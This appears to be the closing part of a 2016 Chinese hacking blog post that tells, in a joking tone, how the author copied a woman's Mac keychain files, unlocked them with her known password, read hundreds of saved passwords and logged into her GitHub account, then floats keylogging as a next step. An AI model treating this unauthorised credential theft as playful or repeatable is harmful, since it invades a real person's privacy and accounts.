+<p><img src="/images/152/152_pic_list.png" alt=""></p>
+<p>别说话，都别说话，尼玛是妹子吗！一共才 108 张照片大部分还都是风景！！！有人的还都是我在朋友圈见过的，我这么辛苦容易吗我？！</p>
+<h3 id="窃取妹子密码"><a href="#窃取妹子密码" class="headerlink" title="窃取妹子密码"></a>窃取妹子密码</h3><p>Mac 下，你的密码会保存在 钥匙串.app 这个 Application 里面，包括你的 chrome 的密码，也会在这里面有。这个 App 会把数据加密后保存在 <code>~/Library/Keychains/</code> 这个目录下，并以 .keychain 为后缀名。</p>
+<p>Bingo, 我们要做的，就是把这个目录下的 .keychain 文件全部打包，然后下载下来，载入到 钥匙串.app 中，然后就能以明文的方式查看了。这里的命令就不说了，和上面基本一样。</p>
+<p>嗯，把妹子的 keychain 文件解压。</p>
+<p><img src="/images/152/152_keychain_dir.png" alt=""></p>
+<p>然后打开 钥匙串.app ，添加一个钥匙串，选择妹子的 keychain, 看到了很多密码，其实还有一个文件，没在图中展示，里面有 300 多条密码记录。</p>
+<p><img src="/images/152/152_keychain_list.png" alt=""></p>
+<p>但是，现在有个问题了，你要查看，就得知道人家的密码啊。</p>
+<p>怎么才能拿到她的密码呢？好像只能键盘记录了吧？其它的办法我还真没想过。</p>
+<blockquote>
+<p>事实上，妹子之前有告诉过我她的 sudo 的密码，所以我试了下，就解开了这个钥匙串的密码。其实她的密码就是 qwer 好吗</p>
+</blockquote>
+<p>然后，通过钥匙串，她保存在这里的密码我全都可以以明文的方式查看。</p>
+<p><img src="/images/152/152_keychain_github_pass.png" alt=""></p>
+<p>登进了她的 github 账号，本来想给她博客上搞个涂鸦的，想了想就没搞了。</p>
+<p><img src="/images/152/152_keychain_github.png" alt=""></p>
+<p>最后我就拿她的 github 账号关注了一下<a href="https://github.com/Medicean" target="_blank" rel="external">我自己的 github 账号</a>，给我涨个粉，2333我好无耻啊。突然想到你们会有人去看我的粉丝列表，于是我又重新取关了。</p>
+<h2 id="后记-妹子我错了"><a href="#后记-妹子我错了" class="headerlink" title="后记(妹子我错了)"></a>后记(妹子我错了)</h2><p>其实这个对其它人来说，可以说是 0 危害。这就和 self xss 一样，自己插自己，但是破了人家账号的就另当别论了，有了你的账号，一举拿下你的所有节点, so… 看好你的账号。</p>
+<blockquote>
+<p>啊，这只是沙龙的时候分享的一小部分啊，看看就好，看看就好。</p>
+</blockquote>
+<p>这尼玛妹子看了绝逼要和我友尽啊。拿她的 github 关注了一下我自己，之后我就再也没有进一步渗透下去了。如果想继续深入，真的就可以上键盘记录，拿到微博啊什么的密码了，不过这些事我没做，毕竟我是一个有操守的人……</p>
+<p>妹子你听我说，你听我解释，我发誓我真的错了，有话好好说，咱把刀放下，我给你跪下还不行嘛……</p>
+<p><img src="/images/152/152_nonono.png" alt=""></p>
+<p><strong>本故事纯属虚构，看看就好，不管你信不信，我反正信了。</strong></p>
+<p>我真的信了。</p>
+</span>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/bugscan/" rel="tag">#bugscan</a>
+          
+            <a href="/tags/hack/" rel="tag">#hack</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/01/27/poc_coding_3/" rel="next">PoC 编写指南(第 2 章 SQL 注入类 PoC 编写 中篇)</a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+ </div>
+
+        
+
+        
+          <div class="comments" id="comments">
+            
+              <div class="ds-thread" data-thread-key="2016/04/12/funny_things_152/"
+                   data-title="进入妹子电脑偷照片和密码实录" data-url="http://blog.evalbug.com/2016/04/12/funny_things_152/">
+              </div>
+            
+          </div>
+        
+      </div>
+
+      
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" src="/images/avatar.jpg" alt="Medici.Yan" itemprop="image"/>
+          <p class="site-author-name" itemprop="name">Medici.Yan</p>
+        </div>
+        <p class="site-description motion-element" itemprop="description">不是路人甲的闲人丁,娱乐型选手</p>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">26</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            <a href="/categories">
+              <span class="site-state-item-count">13</span>
+              <span class="site-state-item-name">分类</span>
+              </a>
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="/tags">
+              <span class="site-state-item-count">24</span>
+              <span class="site-state-item-name">标签</span>
+              </a>
+          </div>
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/medicean" target="_blank">Weibo</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/medicean" target="_blank">GitHub</a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        <div class="links-of-author motion-element">
+          
+            <p class="site-author-name">Friends</p>
+            
+              <span class="links-of-author-item">
+              <a href="http://antoor.github.io" target="_blank">蚁逅</a>
+              </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blog.l1n3.net" target="_blank">LinE</a>
+              </span>
+            
+          
+        </div>
+
+      </section>
+
+      
+        <section class="post-toc-wrap sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator"></div>
+          <div class="post-toc">
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#写在前面"><span class="nav-number">1.</span> <span class="nav-text">写在前面</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第一天-怎么让节点不挂断"><span class="nav-number">2.</span> <span class="nav-text">第一天 怎么让节点不挂断</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第二天-原理"><span class="nav-number">3.</span> <span class="nav-text">第二天 原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第三天-初步渗透"><span class="nav-number">4.</span> <span class="nav-text">第三天 初步渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#制作后门"><span class="nav-number">4.1.</span> <span class="nav-text">制作后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#监听"><span class="nav-number">4.2.</span> <span class="nav-text">监听</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#信息收集"><span class="nav-number">4.3.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Go-Go-Go"><span class="nav-number">4.4.</span> <span class="nav-text">Go!Go!Go!</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#巩固后门"><span class="nav-number">4.5.</span> <span class="nav-text">巩固后门</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第四天-羞羞的事情"><span class="nav-number">5.</span> <span class="nav-text">第四天 羞羞的事情</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#偷看妹子皂片"><span class="nav-number">5.1.</span> <span class="nav-text">偷看妹子皂片</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#窃取妹子密码"><span class="nav-number">5.2.</span> <span class="nav-text">窃取妹子密码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#后记-妹子我错了"><span class="nav-number">6.</span> <span class="nav-text">后记(妹子我错了)</span></a></li></ol></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner"> <div class="copyright" >
+  
+  &copy; &nbsp;  2015 - 
+  <span itemprop="copyrightYear">2016</span>
+  <span class="with-love">
+    <i class="icon-next-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Medici.Yan</span>
+</div>
+
+
+ </div>
+    </footer>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+  
+    
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"medicean"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+    
+     
+
+    
+  
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.5.1"></script>
+
+
+  <script type="text/javascript" src="/js/helpers.js?v=0.4.5.1"></script>
+  
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/js/motion_global.js?v=0.4.5.1" id="motion.global"></script>
+
+
+
+
+  <script type="text/javascript" src="/js/nav-toggle.js?v=0.4.5.1"></script>
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  
+<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.5.1" id="bootstrap.scrollspy.custom"></script>
+
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.motion.complete', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      var $indicator = $(indicator);
+      var opacity = action === 'show' ? 0.4 : 0;
+      $indicator.velocity ?
+        $indicator.velocity('stop').velocity({
+          opacity: opacity
+        }, { duration: 100 }) :
+        $indicator.stop().animate({
+          opacity: opacity
+        }, 100);
+    }
+
+  });
+</script>
+
+<script type="text/javascript" id="sidebar.nav">
+  $(document).ready(function () {
+    var html = $('html');
+    var TAB_ANIMATE_DURATION = 200;
+    var hasVelocity = $.isFunction(html.velocity);
+
+    $('.sidebar-nav li').on('click', function () {
+      var item = $(this);
+      var activeTabClassName = 'sidebar-nav-active';
+      var activePanelClassName = 'sidebar-panel-active';
+      if (item.hasClass(activeTabClassName)) {
+        return;
+      }
+
+      var currentTarget = $('.' + activePanelClassName);
+      var target = $('.' + item.data('target'));
+
+      hasVelocity ?
+        currentTarget.velocity('transition.slideUpOut', TAB_ANIMATE_DURATION, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', TAB_ANIMATE_DURATION)
+            .addClass(activePanelClassName);
+        }) :
+        currentTarget.animate({ opacity: 0 }, TAB_ANIMATE_DURATION, function () {
+          currentTarget.hide();
+          target
+            .stop()
+            .css({'opacity': 0, 'display': 'block'})
+            .animate({ opacity: 1 }, TAB_ANIMATE_DURATION, function () {
+              currentTarget.removeClass(activePanelClassName);
+              target.addClass(activePanelClassName);
+            });
+        });
+
+      item.siblings().removeClass(activeTabClassName);
+      item.addClass(activeTabClassName);
+    });
+
+    $('.post-toc a').on('click', function (e) {
+      e.preventDefault();
+      var targetSelector = escapeSelector(this.getAttribute('href'));
+      var offset = $(targetSelector).offset().top;
+      hasVelocity ?
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        }) :
+        $('html, body').stop().animate({
+          scrollTop: offset
+        }, 500);
+    });
+
+    // Expand sidebar on post detail page by default, when post has a toc.
+    var $tocContent = $('.post-toc-content');
+    if (isDesktop() && CONFIG.sidebar === 'post') {
+      if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+        displaySidebar();
+      }
+    }
+  });
+</script>
+
+
+
+  <script type="text/javascript">
+    $(document).ready(function () {
+      if (CONFIG.sidebar === 'always') {
+        displaySidebar();
+      }
+      if (isMobile()) {
+        FastClick.attach(document.body);
+      }
+    });
+  </script>
+
+  
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/lazyload.js"></script>
+  <script type="text/javascript">
+    $(function () {
+      $("#posts").find('img').lazyload({
+        placeholder: "/images/loading.gif",
+        effect: "fadeIn"
+      });
+    });
+  </script>
+</body>
+</html>
